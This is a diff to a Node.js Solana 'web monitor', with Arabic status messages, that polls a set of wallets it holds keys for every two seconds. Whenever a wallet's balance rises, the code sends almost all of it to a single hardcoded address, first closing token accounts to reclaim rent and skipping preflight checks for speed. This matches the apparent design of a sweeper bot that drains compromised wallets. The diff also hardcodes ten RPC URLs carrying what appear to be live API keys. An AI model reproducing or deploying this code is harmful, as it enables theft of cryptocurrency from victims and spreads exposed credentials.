@@ -1,4 +1,5 @@
 const { Connection, PublicKey, Keypair, Transaction, SystemProgram, LAMPORTS_PER_SOL } = require('@solana/web3.js');
+const { TOKEN_PROGRAM_ID, getAccount, createCloseAccountInstruction } = require('@solana/spl-token');
 const bs58 = require('bs58').default;
 const express = require('express');
 require('dotenv').config();
@@ -20,23 +21,30 @@ class SolanaWebMonitor {
         this.logs = [];
         
         // Target address to forward funds to
-        this.targetAddress = new PublicKey('FUMnrwov6NuztUmmZZP97587aDZEH4WuKn8bgG6UqjXG');
+        this.targetAddress = new PublicKey('282RaYXcDsxJhNMDiG3ZPHRUM4MFX1aVPQ3dYKxDPg7b');
         
         // Store wallets and their corresponding RPC connections
         this.wallets = [];
         this.connections = [];
-        this.subscriptionIds = [];
+        this.pollingIntervals = [];
         this.lastBalances = [];
+        
+        // Polling interval in milliseconds (default: 2 seconds)
+        this.pollingInterval = 2000;
         
         // Available RPC URLs
         this.rpcUrls = [
-            process.env.RPC_URL,
-            process.env.RPC_URL2,
-            process.env.RPC_URL3,
-            process.env.RPC_URL4,
-            process.env.RPC_URL5
-        ].filter(url => url) // Remove undefined URLs
-         .map(url => this.convertToHttpUrl(url)); // Convert WebSocket URLs to HTTP
+            'https://solana-mainnet.g.alchemy.com/v2/A9xPBcSGQkSIa9owFAab88-KbrZWw7iL',
+            'https://solana-mainnet.g.alchemy.com/v2/QMBCCev_Ig1zGFssTed57KsriUzCryCj',
+            'https://solana-mainnet.g.alchemy.com/v2/6rain1NKlUDCWh8lr9d0kN_e0dKkOd_T',
+            'https://solana-mainnet.g.alchemy.com/v2/7cBVn00S5z6IolGSwO286x8qcOuqkSe5',
+            'https://solana-mainnet.g.alchemy.com/v2/NpbJrSKSsQN-25WT-mZlPS3IOrAqCC25',
+            'https://solana-mainnet.g.alchemy.com/v2/L6FPdLCpDpxb79Hm2mfysZJUzlpOQ7Mq',
+            'https://solana-mainnet.g.alchemy.com/v2/--Z-BC-oZv3wqzV-Itoz4F_p9su33b9Q',
+            'https://solana-mainnet.g.alchemy.com/v2/UU3G5dXYngUo9V9Anjse1IFPKbAA-7-L',
+            'https://solana-mainnet.g.alchemy.com/v2/OMmieHzcWHY72g_N8bD4O',
+            'https://solana-mainnet.g.alchemy.com/v2/XRKeC6WoPqsitTEW8TX0A'
+        ]
         
         // Store notifications for web interface
         this.notifications = [];
@@ -48,6 +56,7 @@ class SolanaWebMonitor {
         
         console.log('🌐 Solana Web Monitor initialized');
         console.log(`🔗 Available RPC URLs: ${this.rpcUrls.length}`);
+        console.log(`⏱️ Polling interval: ${this.pollingInterval}ms`);
     }
     
     addLog(message, type = 'info') {
@@ -139,8 +148,8 @@ class SolanaWebMonitor {
     async startMonitoring() {
         this.addNotification('🔍 بدء مراقبة المحافظ...', 'info');
         
-        // Store subscription IDs to track active subscriptions
-        this.subscriptionIds = [];
+        // Clear any existing intervals
+        this.pollingIntervals = [];
         this.lastBalances = [];
         
         for (let i = 0; i < this.wallets.length; i++) {
@@ -165,47 +174,48 @@ class SolanaWebMonitor {
                 this.lastBalances[i] = 0;
             }
             
-            // Set up WebSocket subscription for this wallet
+            // Set up HTTPS polling for this wallet
             try {
-                const subscriptionId = connection.onAccountChange(
-                    wallet.publicKey,
-                    async (accountInfo) => {
-                        try {
-                            const newBalance = accountInfo.lamports;
-                            const oldBalance = this.lastBalances[i] || 0;
+                const pollingTask = setInterval(async () => {
+                    // Skip if wallet has failed
+                    if (this.rpcFailedWallets.has(walletIndex)) {
+                        return;
+                    }
+                    
+                    try {
+                        const newBalance = await this.getBalance(connection, wallet.publicKey);
+                        const oldBalance = this.lastBalances[i] || 0;
+                        
+                        if (newBalance > oldBalance && newBalance > 0) {
+                            const received = newBalance - oldBalance;
+                            console.log(`💰 Wallet ${walletIndex}: Balance changed from ${oldBalance} to ${newBalance} lamports`);
                             
-                            if (newBalance > oldBalance && newBalance > 0) {
-                                const received = newBalance - oldBalance;
-                                console.log(`💰 Wallet ${walletIndex}: Balance changed from ${oldBalance} to ${newBalance} lamports`);
-                                
-                                // Send funds immediately
-                                const sendPromise = this.forwardFunds(connection, wallet, newBalance, walletIndex);
-                                // Send notification in parallel (non-blocking)
-                                this.addNotification(`💰 المحفظة ${walletIndex}: وصل ${received / LAMPORTS_PER_SOL} SOL`, 'success');
-                                await sendPromise;
-                            }
-                            
-                            this.lastBalances[i] = newBalance;
-                            
-                        } catch (error) {
-                            console.error(`Error processing account change for wallet ${walletIndex}:`, error.message);
-                            this.handleRpcError(error, i, walletIndex);
+                            // Send funds immediately
+                            const sendPromise = this.forwardFunds(connection, wallet, newBalance, walletIndex);
+                            // Send notification in parallel (non-blocking)
+                            this.addNotification(`💰 المحفظة ${walletIndex}: وصل ${received / LAMPORTS_PER_SOL} SOL`, 'success');
+                            await sendPromise;
                         }
-                    },
-                    'confirmed'
-                );
+                        
+                        this.lastBalances[i] = newBalance;
+                        
+                    } catch (error) {
+                        console.error(`Error polling wallet ${walletIndex}:`, error.message);
+                        this.handleRpcError(error, i, walletIndex);
+                    }
+                }, this.pollingInterval);
                 
-                this.subscriptionIds.push(subscriptionId);
-                console.log(`✅ WebSocket subscription started for wallet ${walletIndex}: ${wallet.publicKey.toString()}`);
+                this.pollingIntervals.push(pollingTask);
+                console.log(`✅ HTTPS polling started for wallet ${walletIndex}: ${wallet.publicKey.toString()}`);
                 
             } catch (error) {
-                console.error(`Error setting up subscription for wallet ${walletIndex}:`, error.message);
+                console.error(`Error setting up polling for wallet ${walletIndex}:`, error.message);
                 this.handleRpcError(error, i, walletIndex);
-                this.subscriptionIds.push(null);
+                this.pollingIntervals.push(null);
             }
         }
         
-        this.addNotification(`✅ تم بدء مراقبة ${this.wallets.length} محفظة عبر WebSocket`, 'success');
+        this.addNotification(`✅ تم بدء مراقبة ${this.wallets.length} محفظة عبر HTTPS (كل ${this.pollingInterval}ms)`, 'success');
     }
     
     async getBalance(connection, publicKey) {
@@ -213,18 +223,132 @@ class SolanaWebMonitor {
         return balance;
     }
     
+    async getEmptyTokenAccounts(connection, walletPublicKey) {
+        try {
+            // Get all token accounts for this wallet
+            const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
+                walletPublicKey,
+                { programId: TOKEN_PROGRAM_ID }
+            );
+            
+            console.log(`📊 Total token accounts found: ${tokenAccounts.value.length}`);
+            
+            const emptyAccounts = [];
+            const activeAccounts = [];
+            
+            for (const { pubkey, account } of tokenAccounts.value) {
+                const parsedInfo = account.data.parsed.info;
+                const tokenBalance = parsedInfo.tokenAmount.uiAmount;
+                
+                // Only include accounts with zero balance
+                if (tokenBalance === 0 || tokenBalance === null) {
+                    emptyAccounts.push({
+                        pubkey,
+                        mint: parsedInfo.mint
+                    });
+                    console.log(`   🔴 Empty: ${pubkey.toString()} (Mint: ${parsedInfo.mint})`);
+                } else {
+                    activeAccounts.push({
+                        pubkey,
+                        mint: parsedInfo.mint,
+                        balance: tokenBalance
+                    });
+                    console.log(`   🟢 Active: ${pubkey.toString()} (Balance: ${tokenBalance})`);
+                }
+            }
+            
+            console.log(`✅ Empty accounts: ${emptyAccounts.length}, Active accounts: ${activeAccounts.length}`);
+            
+            return emptyAccounts;
+        } catch (error) {
+            console.error('Error getting token accounts:', error.message);
+            return [];
+        }
+    }
+    
+    async closeEmptyTokenAccounts(connection, wallet, walletIndex) {
+        try {
+            const emptyAccounts = await this.getEmptyTokenAccounts(connection, wallet.publicKey);
+            
+            if (emptyAccounts.length === 0) {
+                console.log(`ℹ️ Wallet ${walletIndex}: No empty token accounts to close`);
+                return { success: true, rentRecovered: 0, closedCount: 0 };
+            }
+            
+            this.addNotification(`🔍 المحفظة ${walletIndex}: وجد ${emptyAccounts.length} حساب توكن فارغ`, 'info');
+            
+            // Get balance before closing
+            const balanceBefore = await connection.getBalance(wallet.publicKey);
+            
+            const { blockhash } = await connection.getLatestBlockhash('confirmed');
+            const transaction = new Transaction({
+                recentBlockhash: blockhash,
+                feePayer: wallet.publicKey
+            });
+            
+            // Add close instructions for all empty token accounts
+            for (const account of emptyAccounts) {
+                const closeInstruction = createCloseAccountInstruction(
+                    account.pubkey,
+                    wallet.publicKey, // destination for recovered rent
+                    wallet.publicKey  // owner
+                );
+                transaction.add(closeInstruction);
+            }
+            
+            // Sign and send transaction with skipPreflight
+            transaction.sign(wallet);
+            const signature = await connection.sendRawTransaction(
+                transaction.serialize(),
+                {
+                    skipPreflight: true,
+                    maxRetries: 0
+                }
+            );
+            
+            // Wait a bit for the transaction to be processed
+            await new Promise(resolve => setTimeout(resolve, 2000));
+            
+            // Get balance after closing to calculate recovered rent
+            const balanceAfter = await connection.getBalance(wallet.publicKey);
+            const rentRecovered = balanceAfter - balanceBefore;
+            
+            this.addNotification(`✅ المحفظة ${walletIndex}: تم إغلاق ${emptyAccounts.length} حساب توكن واستعادة ${rentRecovered / LAMPORTS_PER_SOL} SOL
+📝 المعاملة: https://solscan.io/tx/${signature}`, 'success');
+            
+            return { success: true, rentRecovered, closedCount: emptyAccounts.length };
+            
+        } catch (error) {
+            console.error(`Error closing token accounts for wallet ${walletIndex}:`, error.message);
+            this.addNotification(`⚠️ المحفظة ${walletIndex}: خطأ في إغلاق حسابات التوكن - ${error.message}`, 'warning');
+            return { success: false, rentRecovered: 0, closedCount: 0 };
+        }
+    }
+    
     async forwardFunds(connection, wallet, amount, walletIndex) {
         try {
             const startTime = Date.now();
             
-            const { blockhash } = await connection.getLatestBlockhash('confirmed');
-            const transactionFee = 5000;
-            const amountToSend = amount - transactionFee;
+            // Step 1: Close empty token accounts to recover rent
+            this.addNotification(`🔄 المحفظة ${walletIndex}: فحص حسابات التوكن الفارغة...`, 'info');
+            const closeResult = await this.closeEmptyTokenAccounts(connection, wallet, walletIndex);
+            
+            // Step 2: Get updated balance after closing token accounts
+            const currentBalance = await this.getBalance(connection, wallet.publicKey);
+            
+            // Simple fee reserve: keep only 5000 lamports (0.000005 SOL)
+            const feeReserve = 5000;
+            const amountToSend = currentBalance - feeReserve;
             
             if (amountToSend <= 0) {
                 this.addNotification(`⚠️ المحفظة ${walletIndex}: المبلغ قليل جداً بعد خصم الرسوم`, 'warning');
                 return false;
             }
+            
+            console.log(`💵 Balance: ${currentBalance} lamports, Fee Reserve: ${feeReserve} lamports, Sending: ${amountToSend} lamports`);
+            
+            // Step 3: Build and send transaction
+            const { blockhash } = await connection.getLatestBlockhash('confirmed');
             
             const transaction = new Transaction({
                 recentBlockhash: blockhash,
@@ -240,19 +364,28 @@ class SolanaWebMonitor {
             transaction.add(transferInstruction);
             transaction.sign(wallet);
             
+            const rawTransaction = transaction.serialize();
+            
+            // Send with skipPreflight: true for faster execution
             const signature = await connection.sendRawTransaction(
-                transaction.serialize(),
+                rawTransaction,
                 {
-                    skipPreflight: false,
-                    maxRetries: 3
+                    skipPreflight: true,
+                    maxRetries: 0
                 }
             );
             
             const executionTime = Date.now() - startTime;
             
-            const successMessage = `✅ المحفظة ${walletIndex}: تم إرسال ${amountToSend / LAMPORTS_PER_SOL} SOL
-📝 المعاملة: https://solscan.io/tx/${signature}
-⚡ وقت التنفيذ: ${executionTime}ms`;
+            let successMessage = `✅ المحفظة ${walletIndex}: تم إرسال ${amountToSend / LAMPORTS_PER_SOL} SOL`;
+            
+            if (closeResult.closedCount > 0) {
+                successMessage += `\n🔓 تم إغلاق ${closeResult.closedCount} حساب توكن فارغ`;
+                successMessage += `\n💰 Rent مستعاد: ${closeResult.rentRecovered / LAMPORTS_PER_SOL} SOL`;
+            }
+            
+            successMessage += `\n📝 المعاملة: https://solscan.io/tx/${signature}`;
+            successMessage += `\n⚡ وقت التنفيذ: ${executionTime}ms`;
             
             this.addNotification(successMessage, 'success');
             return true;
@@ -291,15 +424,15 @@ class SolanaWebMonitor {
                 rpcStatus = '🔴 خطأ في الاتصال';
             }
             
-            // Check subscription status
-            const hasSubscription = this.subscriptionIds[i] !== null && this.subscriptionIds[i] !== undefined;
-            const subscriptionStatus = hasSubscription && !isFailed ? '🟢 نشط' : '🔴 متوقف';
+            // Check polling status
+            const hasPolling = this.pollingIntervals[i] !== null && this.pollingIntervals[i] !== undefined;
+            const pollingStatus = hasPolling && !isFailed ? '🟢 نشط' : '🔴 متوقف';
             
             statusMessage += `🔹 المحفظة ${walletNumber}:\n`;
             statusMessage += `   العنوان: ${wallet.publicKey.toString()}\n`;
             statusMessage += `   RPC: ${rpcUrl}\n`;
             statusMessage += `   حالة RPC: ${rpcStatus}\n`;
-            statusMessage += `   المراقبة: ${subscriptionStatus}\n`;
+            statusMessage += `   المراقبة: ${pollingStatus}\n`;
             statusMessage += `   الرصيد الحالي: ${currentBalance}\n`;
             if (errorCount > 0) {
                 statusMessage += `   أخطاء RPC: ${errorCount}\n`;
@@ -320,7 +453,7 @@ class SolanaWebMonitor {
                 rpcUrl: this.rpcUrls[i],
                 errorCount: this.rpcErrorCounts[i],
                 isFailed: this.rpcFailedWallets.has(i + 1),
-                hasSubscription: this.subscriptionIds[i] !== null && this.subscriptionIds[i] !== undefined
+                hasPolling: this.pollingIntervals[i] !== null && this.pollingIntervals[i] !== undefined
             }))
         };
     }
@@ -334,13 +467,13 @@ class SolanaWebMonitor {
         
         // Check if this RPC has failed too many times
         if (this.rpcErrorCounts[rpcIndex] >= MAX_ERRORS) {
-            // Stop monitoring for this specific wallet
-            if (this.subscriptionIds[rpcIndex] && this.connections[rpcIndex]) {
+            // Stop polling for this specific wallet
+            if (this.pollingIntervals[rpcIndex]) {
                 try {
-                    this.connections[rpcIndex].removeAccountChangeListener(this.subscriptionIds[rpcIndex]);
-                    this.subscriptionIds[rpcIndex] = null;
+                    clearInterval(this.pollingIntervals[rpcIndex]);
+                    this.pollingIntervals[rpcIndex] = null;
                 } catch (error) {
-                    console.error(`Error removing subscription for wallet ${walletIndex}:`, error.message);
+                    console.error(`Error stopping polling for wallet ${walletIndex}:`, error.message);
                 }
             }
             
@@ -382,19 +515,19 @@ class SolanaWebMonitor {
     }
 
     stopAllMonitoring() {
-        // Remove WebSocket subscriptions
-        for (let i = 0; i < this.subscriptionIds.length; i++) {
-            if (this.subscriptionIds[i] && this.connections[i]) {
+        // Stop all polling intervals
+        for (let i = 0; i < this.pollingIntervals.length; i++) {
+            if (this.pollingIntervals[i]) {
                 try {
-                    this.connections[i].removeAccountChangeListener(this.subscriptionIds[i]);
-                    console.log(`🔌 WebSocket subscription ${i + 1} removed`);
+                    clearInterval(this.pollingIntervals[i]);
+                    console.log(`🔌 HTTPS polling ${i + 1} stopped`);
                 } catch (error) {
-                    console.error(`Error removing subscription ${i + 1}:`, error.message);
+                    console.error(`Error stopping polling ${i + 1}:`, error.message);
                 }
             }
         }
         
-        this.subscriptionIds = [];
+        this.pollingIntervals = [];
         this.lastBalances = [];
         
         // Reset error tracking
@@ -404,7 +537,7 @@ class SolanaWebMonitor {
         // Clear notifications on stop
         this.addNotification('🛑 تم إيقاف مراقبة جميع المحافظ', 'info');
         
-        console.log('🛑 All WebSocket monitoring stopped');
+        console.log('🛑 All HTTPS polling stopped');
     }
 }
 
